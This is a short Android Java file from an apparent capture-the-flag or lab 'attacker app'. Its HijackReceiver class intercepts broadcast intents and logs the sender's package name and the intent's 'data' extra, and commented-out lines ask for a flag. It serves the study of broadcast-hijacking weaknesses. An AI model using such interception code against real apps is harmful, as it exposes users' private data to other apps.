package com.example.attackerapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import android.widget.Toast;

public class HijackReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Toast.makeText(context, "Success", Toast.LENGTH_SHORT).show();
        // TODO: This method is called when the BroadcastReceiver is receiving
        // an Intent broadcast.
        //Log.d("Flag", intent.getStringExtra("flag"));
        //setResult(1, "give flag plx", null);
        Log.d("Receiver", "received message from " + intent.getComponent().getPackageName());
        String receivedData = intent.getStringExtra("data");
        Log.d("Receiver", "data: " + receivedData);
    }
}